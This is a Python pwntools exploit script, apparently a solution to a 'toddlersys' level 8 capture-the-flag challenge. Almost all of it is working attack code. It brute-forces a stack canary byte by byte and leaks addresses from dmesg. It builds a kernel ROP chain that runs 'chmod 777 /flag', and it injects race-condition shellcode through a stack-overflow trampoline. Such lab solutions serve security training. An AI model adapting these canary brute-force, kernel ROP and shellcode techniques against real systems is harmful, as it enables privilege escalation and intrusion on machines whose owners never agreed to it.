def getarg(arg):
    if arg[0:2] == "0x":
        return int(arg, 16).to_bytes(1, "little")
    if arg[0] == "*":
        arg=arg[1:]
    ireg = 1
    reg="cdsabif"
    if reg.find(arg) != -1:
        ireg = ireg << reg.find(arg)
        return ireg.to_bytes(1, "little")
    elif arg == "open":
        return b"\x01"
    elif arg == "read_memory":
        return b"\x02"
    elif arg == "write":
        return b"\x10"
    elif arg == "exit":
        return b"\x08"
    return None
def assembly(ass):
    if ass == "":
        return b""
    bc = bytearray()
    ass = ass.split(" ")
    if(ass[0] == "IMM"):
        op = b"\x20"
    elif(ass[0] == "ADD"):
        op = b"\x40"
    elif(ass[0] == "STK"):
        op = b"\x02"
    elif(ass[0] == "STM"):
        op = b"\x08"
    elif(ass[0] == "LDM"):
        op = b"\x01"
    elif(ass[0] == "CMP"):
        op = b"\x04"
    elif(ass[0] == "JMP"):
        op = b"\x80"
    elif(ass[0] == "SYS"):
        op = b"\x10"
    
    for i in ass:
        c = getarg(i)
        if c != None:
            bc = bytearray(c) + bc

    bc.insert(1, op[0])
    return bc





from pwn import *
import psutil
BINARY = "/challenge/toddlersys_level8.0"
PID = 212
cmd = b"/run/workspace/bin/chmod 777 /flag\x00"
# display the bytes
# print(disasm(my_sc))
context.arch="amd64"
context.os = "linux"

# context.terminal = ['tmux', 'splitw', '-h']
# p = gdb.debug("/challenge/toddlersys_level2.0", gdbscript="source /opt/gef/gef.py")
def load_program(n:connect, i:int, c:bytearray):
    n.sendline(b"load_program")
    n.sendline(str(i).encode())
    n.send(c)
def init_ypu(n:connect, i:int, j:int):
    n.sendline(b"init_ypu")
    n.sendline(str(i).encode())
    n.sendline(str(j).encode())
def run_ypu(n:connect, i:int):
    n.sendline(b"run_ypu")
    n.sendline(str(i).encode())
def quit(n:connect):
    n.sendline(b"quit")

def process_is_exit(pid:int):
    parent_proc = psutil.Process(pid)
    child_procs = parent_proc.children(recursive=True)

    if (len(child_procs) > 0):
        return True
    return False


crash_program = 15
current = b'A' * (0x3020 - 0x2d00 - 0x8)
canary=b""
nc = connect("127.0.0.1", 1337)
sleep(0.1)
crashing_yancode = b'A' * (0x3020 - 0x2d00 - 0x8) + canary + b"A"*0x10
load_program(nc, crash_program, crashing_yancode)
sleep(0.1)
quit(nc)
sleep(0.1)
nc.close()


while True:
    for b in range(256):
        r = remote("localhost", 1337)
        exp = current + b.to_bytes(1, "little")
        time.sleep(0.3)
        with process('pgrep -f challenge | tail -n 2', shell=True) as pgrep:
            r_pid = pgrep.readline()[:-1]
            r_pid = int(r_pid, 10)
        while process_is_exit(PID):
            load_program(r, crash_program, exp)
            time.sleep(0.3)
            r.sendline(b'quit')
            time.sleep(0.3)
        r.close()
        with process('dmesg | grep /challenge/toddlersys_level | grep audit | tail -n 1', shell=True) as dmesg:
            dmesg.recvuntil(b'pid=')
            crashed_pid = int(dmesg.recvuntil(b' ')[:-1], 10)
            
        if crashed_pid == r_pid:
            continue
        with process('dmesg | grep /challenge/toddlersys_level | grep audit | tail -n 1', shell=True) as dmesg:
            dmesg.recvuntil(b'pid=')
            crashed_pid = int(dmesg.recvuntil(b' ')[:-1], 10)
                
        if crashed_pid != r_pid:
            log.info(f'NEW {str(len(canary) + 1)} BYTE FOUND: {hex(b)}')
            canary += b.to_bytes(1, 'little')
            current = exp
            break
    if len(canary) >= 8:
        break


nc = connect("127.0.0.1", 1337)
sleep(0.1)
crashing_yancode = b'A' * (0x3020 - 0x2d00 - 0x8) + canary + b"A"*0x10
load_program(nc, crash_program, crashing_yancode)
sleep(0.1)
quit(nc)
sleep(0.1)
nc.close()


dmesg = process('dmesg | grep traps | tail -n 1', shell=True)
dmesg.recvuntil(b'ip:')
ip_leak = int(dmesg.recvuntil(b' '), 16)
dmesg.recvuntil(b'sp:')
sp_leak = int(dmesg.recvuntil(b' '), 16)
dmesg.kill()
print("ip_leak: "+hex(ip_leak) + "\nsp_leak: " + hex(sp_leak))

base_addr = ip_leak - 0x175D



leak_addr_yangasm = '''
IMM d = 0x2f
IMM c = 0x80
STM *c = d

IMM d = 0x68
IMM c = 0x81
STM *c = d

IMM d = 0x6f
IMM c = 0x82
STM *c = d

IMM d = 0x6d
IMM c = 0x83
STM *c = d

IMM d = 0x65
IMM c = 0x84
STM *c = d

IMM d = 0x2f
IMM c = 0x85
STM *c = d

IMM d = 0x68
IMM c = 0x86
STM *c = d

IMM d = 0x61
IMM c = 0x87
STM *c = d

IMM d = 0x63
IMM c = 0x88
STM *c = d

IMM d = 0x6b
IMM c = 0x89
STM *c = d

IMM d = 0x65
IMM c = 0x8a
STM *c = d

IMM d = 0x72
IMM c = 0x8b
STM *c = d

IMM d = 0x2f
IMM c = 0x8c
STM *c = d

IMM d = 0x62
IMM c = 0x8d
STM *c = d

IMM d = 0x0
IMM c = 0x8e
STM *c = d

IMM a = 0x80
IMM b = 0x02
IMM c = 0x00
SYS open a

IMM b = 0xff
IMM c = 0xff
SYS write a

SYS exit a
'''


leak_addr_yangasm = leak_addr_yangasm.split("\n")
c=bytearray()
for i in leak_addr_yangasm:
    c += assembly(i)
nc = remote("127.0.0.1", 1337)
load_program(nc, 0, c)
sleep(1)
init_ypu(nc, 0, 0)
sleep(1)
run_ypu(nc, 0)
sleep(1)

with open("b", "rb") as fd:
    leak_info = fd.read()

ker_canary = leak_info[0x198-0x18-0xff: 0x198 - 0x18 - 0xff + 0x8]
ret_rip = leak_info[0x198 - 0xff: 0x198 - 0xff + 0x8]
yancode_mmap_addr  = leak_info[0x1: 0x9]

pop_rdi_addr = 0xffffffff81001518 + int.from_bytes(ret_rip,"little") - 0xFFFFFFFF81242235
run_cmd = 0xFFFFFFFF81089B30 + int.from_bytes(ret_rip,"little") - 0xFFFFFFFF81242235

exp_yangasm = '''
IMM d = 0x2f
IMM c = 0x80
STM *c = d

IMM d = 0x68
IMM c = 0x81
STM *c = d

IMM d = 0x6f
IMM c = 0x82
STM *c = d

IMM d = 0x6d
IMM c = 0x83
STM *c = d

IMM d = 0x65
IMM c = 0x84
STM *c = d

IMM d = 0x2f
IMM c = 0x85
STM *c = d

IMM d = 0x68
IMM c = 0x86
STM *c = d

IMM d = 0x61
IMM c = 0x87
STM *c = d

IMM d = 0x63
IMM c = 0x88
STM *c = d

IMM d = 0x6b
IMM c = 0x89
STM *c = d

IMM d = 0x65
IMM c = 0x8a
STM *c = d

IMM d = 0x72
IMM c = 0x8b
STM *c = d

IMM d = 0x2f
IMM c = 0x8c
STM *c = d

IMM d = 0x63
IMM c = 0x8d
STM *c = d

IMM d = 0x0
IMM c = 0x8e
STM *c = d

IMM a = 0x80
IMM b = 0x02
IMM c = 0x00
SYS open a

IMM b = 0xff
IMM c = 0xff
SYS read_memory a

SYS exit a
'''
exp_yangasm = exp_yangasm.split("\n")
c=bytearray()
for i in exp_yangasm:
    c += assembly(i)
cmd_arg = int.from_bytes(yancode_mmap_addr, "little") + len(c)

exp = bytearray(leak_info)
rop_chain = p64(pop_rdi_addr) + p64(cmd_arg) + p64(run_cmd)
exp = leak_info[0:0x198 - 0xff] + rop_chain
exp = exp.replace(b"{", b"\x00")
with open("c", "wb") as fd:
    fd.write(exp)
c+=cmd


load_program(nc, 0, c)
sleep(1)
init_ypu(nc, 0, 0)
sleep(1)
run_ypu(nc, 0)
sleep(1)


binary = ELF(BINARY)
binary.address = base_addr
ypu_0_mmap_addr = binary.symbols['data'] + 8
log.info(f'ypu_0_mmap_addr: {hex(ypu_0_mmap_addr)}')


SHELLCODE = '''
read_mmap:
mov rbx, {0}
mov rcx, [rbx]
mov [rip + saved_mmap_addr], rcx

do_clone:
mov r9, QWORD PTR fs:0x10
xor r8, r8
lea r10, [r9 + 0x2d0]
xor rdx, rdx
xor rsi, rsi
mov rdi, 0x1200011
mov rax, 56
syscall
cmp rax, 0
jne parent

child:
mov rbx, [rip + saved_mmap_addr]
add rbx, {3}
mov cl, {1}
mov dl, {2}

race_loop:
mov byte ptr [rbx], cl
mov byte ptr [rbx], dl
jmp race_loop

parent:

ioctl_loop:
mov rdi, 4
mov rsi, 1337
mov rax, 16
syscall
jmp ioctl_loop

saved_mmap_addr:
.byte 0
.byte 0
.byte 0
.byte 0
.byte 0
.byte 0
.byte 0
.byte 0
'''
shellcode_program = 0
shellcode = b'\x90' * 0x100
shellcode += asm(SHELLCODE.format(ypu_0_mmap_addr, 0x10, 0x04, 0x9a))
shellcode += b'\x90' * (0x1000 - len(shellcode))
load_program(nc, shellcode_program, shellcode)

shellcode_addr = sp_leak - 0x3028
trampoline_program = 15
trampoline = current + canary + p64(shellcode_addr) + p64(shellcode_addr)
trampoline += b'B' * (0x1000 - len(trampoline))
load_program(nc, trampoline_program, trampoline)
quit(nc)